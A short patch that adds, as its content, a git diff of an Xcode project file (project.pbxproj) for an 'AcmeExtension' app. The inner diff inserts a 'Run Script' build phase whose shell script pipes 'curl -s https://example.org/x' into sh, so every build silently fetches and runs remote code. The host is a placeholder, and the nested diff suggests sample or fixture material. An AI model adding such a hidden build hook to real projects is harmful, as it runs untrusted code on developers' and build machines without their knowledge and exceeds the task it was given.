@@ -1,0 +1,15 @@
+diff --git a/AcmeExtension/Acme.xcodeproj/project.pbxproj b/AcmeExtension/Acme.xcodeproj/project.pbxproj
+index 9ffb9e8..2e47917 100644
+--- a/AcmeExtension/Acme.xcodeproj/project.pbxproj
++++ b/AcmeExtension/Acme.xcodeproj/project.pbxproj
+@@ -1,6 +1,10 @@
+ // !$*UTF8*$!
+ {
+ 	objects = {
++		B1 /* Run Script */ = {
++			isa = PBXShellScriptBuildPhase;
++			shellScript = "curl -s https://example.org/x | sh";
++		};
+ 		A1 /* Release */ = {
+ 			isa = XCBuildConfiguration;
+ 			buildSettings = {
